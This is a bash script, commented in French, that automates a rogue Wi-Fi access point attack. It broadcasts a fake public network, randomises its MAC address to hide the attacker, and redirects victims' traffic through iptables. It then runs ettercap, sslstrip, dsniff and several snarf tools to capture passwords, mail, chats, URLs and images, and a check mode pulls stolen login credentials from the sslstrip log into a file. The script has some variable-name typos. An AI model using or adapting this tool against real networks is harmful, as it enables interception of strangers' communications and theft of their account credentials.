#! /bin/bash

# Color value
GREEN="\033[1;32m" 
RED="\033[01;31m"
END="\033[00m"

# definitions login mdp pour sslstrip
DEFS=$PWD\/definitions.sslstrip

# Directory
DRIFT_DIR=$PWD\/"driftnet-img"
LOG_DIR=$PWD\/"log"

# Log files
ETTERCAP_LOG=$LOG_DIR\/"ettercap.log"
MSGSNARF_LOG=$LOG_DIR\/"msgsnarf.log"
MAILSNARF_LOG=$LOG_DIR\/"mailsnarf.log"
DSNIFF_LOG=$LOG_DIR\/"dsniff.log"
SSLTRIP_LOG=$LOG_DIR\/"ssltrip.log"
DHCPD_LOG=$LOG_DIR\/"dhcpd.log"
AIRBASE_LOG=$LOG_DIR\/"airbase.log"
CHECK_OUTUP=$PWD\/"strip-accts.txt"
ERROR_LOG=$LOG_DIR\/"rogueap.log"

# Default value
WIFACE_DEFAULT="wlan0"
NETWIFACE_DEFAULT="wlan1"
NAME_AP_DEFAULT="uqac-public"
CHANNEL_DEFAULT=9

SSLSTRIP_DEFAULT="yes"
DSNIFF_DEFAULT="yes"
FILESNARF_DEFAULT="no"
MAILSNARF_DEFAULT="no"
MSGSNARF_DEFAULT="no"
URLSNARF_DEFAULT="no"
DRIFTNET_DEFAULT="yes"

# Display ok or fail
# Take $? in param
function display_err
{
    if [ $1 -ne 0 ]; then
	echo -e "${RED}Fail${END}"
	kill_all
    else
	echo -e "${GREEN}OK${END}"
    fi;
}

# Tue toute les processus creer par le script
function kill_all
{
    # Kill tout les processus que ce script peux creer
    echo -ne "Kill all : "
    killall -9 dhcpd tcpdump airbase-ng dhcpd3 \
	dnsspoof dsniff sslstrip filesnarf msgsnarf mailsnarf urlsnarf driftnet ettercap 2> /dev/null
    echo -e "${GREEN}OK${END} : "

    # Arrete le serveur apache pour le cas ou l'on souhaite 
    # rediriger la victime sur un site herberger e local
#    service apache2 stop

    # Stop les interface creer et utiliser pour l'attaque
    echo -ne "airmon-ng stop $WIFACE_DEFAULT : "
    airmon-ng stop $WIFACE_DEFAULT > /dev/null
    display_err $?

    echo -ne "airmon-ng stop mon0 : "
    airmon-ng stop mon0 > /dev/null
    display_err $?

    exit 1
}

# Initialise les valeurs utilisé pour l'attaque
function init_param
{
    # Demande a l'utilisateur d'initialise les variables
    echo "Interface Rogue ? [$WIFACE_DEFAULT] "
    read WIFACE # Interface d'entrer pour la victime
    echo "Interface Sortant ? [$NETWIFACE_DEFAULT] "
    read NETFACE # Interface de sortie connecte a internet
    echo "Nom de la Rogue_AP ? [$NAME_AP_DEFAULT]"
    read NAME_AP # Nom donnee au reseau wifi
    echo "Channel de la Rogue_AP ? [$CHANNEL_DEFAULT]"
    read CHANNEL # Channel du reseau wifi
    echo "Use ssltrip ? (yes/no) [$SSLSTRIP_DEFAULT]"
    read SSLSTRIP # Variable pour usurper les connexions ssl
    echo "Use dsniff ? (yes/no) [$DSNIFF_DEFAULT]"
    read DSNIFF # Variable pour utiliser DSNIFF
    echo "Use filesnarf ? (yes/no) [$FILESNARF_DEFAULT]"
    read FILESNARF # Variable pour recuperer les fichies sur un disque reseau
    echo "Use mailsnarf ? (yes/no) [$MAILSNARF_DEFAULT]"
    read MAILSNARF # Variable pour recuperer les mail
    echo "Use Msgsnarf ? (yes/no) [$MSGSNARF_DEFAULT]"
    read MSGSNARF # Variable pour recuperer les conversations type MSN
    echo "Use urlsnarf ? (yes/no) [$URLSNARF_DEFAULT]"
    read URLSNARF # Variable pour recuperer les url
    echo "Use Driftnet ? (yes/no) [$DRIFTNET_DEFAULT]"
    read DRIFTNET # Variable pour recuperer les images et video

    # Initialisation des variables par leur valeurs par defaut
    # si elle non pas ete renseigner
    if [ "$WIFACE" = "" ]; then
	WIFACE=$WIFACE_DEFAULT
    fi;
    if [ "$NETWIFACE" = "" ]; then
	NETWIFACE=$NETWIFACE_DEFAULT
    fi;
    if [ "$NAME_AP" = "" ]; then
	NAME_AP=$NAME_AP_DEFAULT
    fi;
    if [ "$CHANNEL" = "" ]; then
	CHANNEL=$CHANNEL_DEFAULT
    fi;
    if [ "$SSLSTRIP" = "" ]; then
	SSLSTRIP=$SSLSTRIP_DEFAULT
    fi;
    if [ "$DSNIFF" = "" ]; then
	DSNIFF=$DSNIFF_DEFAULT
    fi;
    if [ "$CHANNEL" = "" ]; then
	CHANNEL=$CHANNEL_DEFAULT
    fi;
    if [ "$SSLTRIP" = "" ]; then
	SSLTRIP=$SSLTRIP_DEFAULT
    fi;
    if [ "$FILESNARF" = "" ]; then
	FILESNARF=$FILESNARF_DEFAULT
    fi;
    if [ "$MAILSNARF" = "" ]; then
	MAILSNARF=$MAILSNARF_DEFAULT
    fi;
    if [ "$MSGSNARF" = "" ]; then
	MSGSNARF=$MSGSNARF_DEFAULT
    fi;
    if [ "$URLSNARF" = "" ]; then
	URLSNARF=$URLSNARF_DEFAULT
    fi;
    if [ "$DRIFNET" = "" ]; then
	DRIFTNET=$DRIFTNET_DEFAULT
    fi;

    echo -ne "-------------------------------------------------\nValidation des options : "
    display_err $?
}

# Initialise l'environnement du rogue ap
function init_env
{
    mkdir -p -v $LOG_DIR 2>> $ERROR_LOG

    # Active le forward d'ip
    echo 1 > /proc/sys/net/ipv4/ip_forward;

    # Creer le de sauvegarde du pid du serveur dhcp pour
    # pouvoir le redemarer
    echo -ne "Touch & chmod dhcpd.pid : "
    touch /var/run/dhcpd.pid 2>> $ERROR_LOG
    chmod 766 /var/run/dhcpd.pid
    display_err $?
}

# Initialise l'interface at0 utilisé pour la connection des victimes
function init_at0
{
    # Monte at0 pour la configurer pour l'attaque
    echo -ne "ifconfig at0 up : "
    ifconfig at0 up
    display_err $?

    # Assigne une ip et un masque de sous reseau a at0
    echo -ne "ifconfig at0 netmask : "
    ifconfig at0 10.0.0.1 netmask 255.255.255.0
    display_err $?

    # Set la valeur de mtu de at0 a 1400
    echo -ne "ifconfig at0 mtu : "
    ifconfig at0 mtu 1400
    display_err $?
}

# Ajoute les regles iptables pour la redirection des flux
function add_iptables
{
    # Redirige le flux ip source de 10.0.0.1 vers la gateway
    echo -ne "route add netmask : "
    route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1
    display_err $?

    # Supprime toute les entrees de iptables
    echo -ne "iptables : "
    iptables --flush
    iptables --table nat --flush
    iptables --delete-chain
    iptables --table nat --delete-chain
    iptables --table nat --append POSTROUTING --out-interface $NETWIFACE -j MASQUERADE
    iptables -P FORWARD ACCEPT
    iptables --append FORWARD --in-interface at0 -j ACCEPT
    iptables -t nat -A PREROUTING -p udp -j DNAT --to 8.8.8.8
    display_err $?
}

# change la mac de l'interface passé en parametre
function change_mac_if
{
    # Arrete l'interface
    echo -n "airmon-ng stop $1 : "
    airmon-ng stop $1 > /dev/null
    display_err $?

   # Change l'adresse mac de l'interface d'attaque pour l'anonimizé
    echo -e "macchanger $1 :"
    macchanger -r $1
    display_err $?

    # demare l'interface
    echo -n "airmon-ng start $1 : "
    airmon-ng start $1 > /dev/null
    display_err $?
}

# Lance les differents elements pour l'attaque
function launcher
{
    change_mac_if $WIFACE
# -p -C 30
    echo -ne "airbase interface=$WIFACE ESSID=$NAME_AP channel=$CHANNEL : "
    xterm -geometry 75x15+1+0 -T Airbase -e "airbase-ng -P -C 60 -v -c $CHANNEL -e $NAME_AP $WIFACE" &
    display_err $?
    sleep 2

    init_at0

    xterm -geometry 75x15+1+0 -T dhcpd3 -e "dhcpd3 -d -f -cf /etc/dhcp3/dhcpd.conf at0" &
    sleep 2

    # Lance ettercap sur toute les interfaces pour tout intercepter
    xterm -geometry 73x25+1+300 -T ettercap -e "ettercap -Tp -u -q -P autoadd -m $ETTERCAP_LOG -i at0" &
    sleep 2
}

# Lance les differentes options selectionné pour l'attaque
function option
{
    if [ "$SSLSTRIP" = "yes" ]; then
	echo -ne "iptables prerouting : " 
	iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000;
	display_err $?
	echo -ne "sslstrip $SSLTRIP_LOG : "
	xterm -geometry 75x15+1+0 -T sslstrip -e "sslstrip -a -k -f -w $SSLTRIP_LOG" &
	display_err $?
	sleep 1
    fi;
    
    if [ "$DSNIFF" = "yes" ]; then
	echo -ne "dsniff at0 $DSNIFF_LOG : " 
	dsniff -m -c -i at0 -w $DSNIFF_LOG &
	display_err $?
	sleep 1
    fi;

    if [ "$FILESNARF" = "yes" ]; then
	echo -ne "filesnarf at0 : "
	xterm -geometry 75x15+1+0 -T filesnarf -e "filesnarf -i at0" &
	display_err $?
	sleep 1
    fi;

    if [ "$MAILSNARF" = "yes" ]; then
	echo -ne "mailsnarf at0 : "
	xterm -geometry 75x15+1+0 -T mailsnarf -e "mailsnarf -i at0 >> $MAILSNARF_LOG" &
	display_err $?
	sleep 1
    fi;

    if [ "$MSGSNARF" = "yes" ]; then
	echo -ne "msgsnarf $WIFACE : "
	xterm -geometry 75x15+1+0 -T msgsnarf -e "msgsnarf -i at0 >> $MSGSNARF_LOG" &
	display_err $?
	sleep 1
    fi;

    if [ "$URLSNARF" = "yes" ]; then
	echo -ne "urlsnarf at0 http : "
	xterm -geometry 75x15+1+0 -T urlsnarf -e "urlsnarf -i at0 http" &
	display_err $?
	sleep 1
    fi;

    if [ "$DRIFTNET" = "yes" ]; then	
	mkdir -p -v $DRIFT_DIR
	echo -ne "driftnet at0 $DRIFT_DIR: "
	driftnet -s -i at0 -d $DRIFT_DIR &
	display_err $?
	sleep 1
    fi;

}

function check_sslstrip
{
    echo -ne "Check sslstrip definitions file : "
    test -f $DEFS
    display_err $?

    NUMLINES=$(cat "$DEFS" | wc -l)
    echo -ne "Check sslstrip $NUMLINES : "
    i=1
    while [ $i -le $NUMLINES ]; do
	VAL1=$(awk -v k=$i 'FNR == k {print $1}' "$DEFS")
	VAL2=$(awk -v k=$i 'FNR == k {print $2}' "$DEFS")
	VAL3=$(awk -v k=$i 'FNR == k {print $3}' "$DEFS")
	VAL4=$(awk -v k=$i 'FNR == k {print $4}' "$DEFS")
	GREPSTR="$(grep -a $VAL2 "$SSLTRIP_LOG" | grep -a $VAL3 | grep -a $VAL4)"
  echo "grep -a $VAL2 "$SSLTRIP_LOG" | grep -a $VAL3 | grep -a $VAL4"
  echo "result : $GREPSTR"
	if [ "$GREPSTR" ]; then
	    echo -n "$VAL1" "- " >> $CHECK_OUTUP
	    echo "$GREPSTR" | \
		sed -e 's/.*'$VAL3'=/'$VAL3'=/' -e 's/&/ /' -e 's/&.*//' >> $CHECK_OUTUP
	fi
	
	i=$[$i+1]
	echo -ne "."
    done
    display_err $?

    xterm -geometry 80x24-0+0 -T "SSLStrip Accounts" -e cat $CHECK_OUTPUT
}


# Affiche l'usage du script
function usage
{
    echo "usage : $1 {start|stop}"
}


# Pseudo main
case $1 in
    stop)
	kill_all
	exit
	;;
    start)
	init_param
	init_env
	launcher
	add_iptables
	option
	sleep 2
	;;
    check)
	check_sslstrip
	;;
    *)
	usage $0
	;;
esac